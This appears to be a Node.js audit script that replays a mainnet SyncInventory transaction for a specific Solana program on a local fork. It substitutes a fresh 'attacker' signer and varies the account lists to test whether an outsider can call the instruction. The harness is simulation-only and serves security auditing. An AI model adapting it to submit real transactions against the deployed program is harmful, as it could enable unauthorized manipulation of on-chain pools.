#!/usr/bin/env node
// Fresh outsider signature against the deployed SyncInventory instruction on a local fork.
// Simulation only; never sends or commits a transaction.
const fs=require('fs');
const modules='/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/';
const {PublicKey,Keypair,TransactionInstruction,TransactionMessage,VersionedTransaction,SystemProgram}=require(modules+'@solana/web3.js');
const bs58mod=require(modules+'bs58'),bs58=bs58mod.default||bs58mod;
const program='2rU1oCHtQ7WJUvy15tKtFvxdYNNSc3id7AzUcjeFSddo';
const signature=process.env.SYNC_SIGNATURE||'wgeKre55kUNfuN1MiYn6CdAdBDVXkrH15y5YRuQVvf6KbdckMCxGwWGdipLgcbdiSLsBBjirihX4cFr9oaARDqD';
const env=Object.fromEntries(fs.readFileSync('/tmp/composer-helius-only.env','utf8')
 .split('\n').filter(Boolean).map(x=>x.split(/=(.*)/s).slice(0,2)));
const mainnet=env.HEAVY_RPC_URL||env.RPC_URL;
const fork=process.env.FORK_RPC||'http://127.0.0.1:9397';
let id=0;
async function rpc(url,method,params){
 const r=await fetch(url,{method:'POST',headers:{'content-type':'application/json'},
  body:JSON.stringify({jsonrpc:'2.0',id:++id,method,params})});
 const j=await r.json();if(j.error)throw Error(method+' '+JSON.stringify(j.error));return j.result;
}
function changedBytes(a,b){
 if(!a||!b)return null;const x=Buffer.from(a,'base64'),y=Buffer.from(b,'base64'),out=[];
 for(let i=0;i<Math.max(x.length,y.length);i++)if(x[i]!==y[i])out.push(i);
 return {beforeLength:x.length,afterLength:y.length,changedOffsets:out.slice(0,80),changedCount:out.length};
}
async function main(){
 const tx=await rpc(mainnet,'getTransaction',[signature,
  {encoding:'jsonParsed',commitment:'confirmed',maxSupportedTransactionVersion:1}]);
 if(!tx||tx.meta.err)throw Error('positive historical transaction unavailable');
 const msg=tx.transaction.message;
 const raw=msg.instructions.find(i=>i.programId===program);
 const flag=Object.fromEntries(msg.accountKeys.map(k=>[k.pubkey,k]));
 const originalSigner=msg.accountKeys.find(k=>k.signer).pubkey;
 const attacker=Keypair.generate();
 await rpc(fork,'surfnet_setAccount',[attacker.publicKey.toBase58(),
  {data:'',executable:false,lamports:1_000_000_000,owner:SystemProgram.programId.toBase58(),rentEpoch:0}]);
 await rpc(fork,'getMultipleAccounts',[raw.accounts,{encoding:'base64',commitment:'processed'}]);
 const pool=raw.accounts[0];
 const prior=(await rpc(fork,'getAccountInfo',[pool,{encoding:'base64',commitment:'processed'}])).value;
 const variations=[
  {label:'historical_accounts_fresh_signer',addresses:raw.accounts},
  {label:'omit_inventory_accounts',addresses:raw.accounts.slice(0,5)},
  {label:'single_inventory_account',addresses:raw.accounts.slice(0,6)},
  {label:'duplicate_first_inventory_account',addresses:[...raw.accounts.slice(0,5),raw.accounts[5],raw.accounts[5]]}
 ];
 const results=[];
 for(const variation of variations){
  const keys=variation.addresses.map(s=>{
   const old=flag[s];if(!old)throw Error('account flag missing '+s);
   return {pubkey:new PublicKey(s===originalSigner?attacker.publicKey.toBase58():s),
    isSigner:!!old.signer,isWritable:!!old.writable};
  });
  const ix=new TransactionInstruction({programId:new PublicKey(program),keys,data:Buffer.from(bs58.decode(raw.data))});
  const blockhash=(await rpc(fork,'getLatestBlockhash',[{commitment:'processed'}])).value.blockhash;
  const message=new TransactionMessage({payerKey:attacker.publicKey,recentBlockhash:blockhash,
   instructions:[ix]}).compileToV0Message();
  const signed=new VersionedTransaction(message);signed.sign([attacker]);
  const wire=Buffer.from(signed.serialize());
  const sim=await rpc(fork,'simulateTransaction',[wire.toString('base64'),
   {encoding:'base64',sigVerify:true,replaceRecentBlockhash:false,commitment:'processed',
    accounts:{encoding:'base64',addresses:[pool]}}]);
  const after=sim.value.accounts?.[0];
  const result={label:variation.label,err:sim.value.err,bytes:wire.length,
   accountKeys:message.staticAccountKeys.length,unitsConsumed:sim.value.unitsConsumed,
   poolDiff:changedBytes(prior.data?.[0],after?.data?.[0]),logs:sim.value.logs};
  results.push(result);
  console.log(JSON.stringify({label:result.label,err:result.err,bytes:result.bytes,
   accountKeys:result.accountKeys,poolDiff:result.poolDiff,
   errorLog:result.logs?.find(x=>x.includes('Error')||x.includes('error'))}));
 }
 fs.writeFileSync(__dirname+'/2ru1-sync-inventory-signed-screen-'+signature.slice(0,8)+'.json',JSON.stringify({
  generatedAt:new Date().toISOString(),program,sourceSignature:signature,
  sourceSlot:tx.slot,attacker:attacker.publicKey.toBase58(),sigVerify:true,
  mainnetSubmitted:false,forkSubmitted:false,pool,results},null,2)+'\n');
}
main().catch(e=>{console.error(e.stack||e);process.exitCode=1});
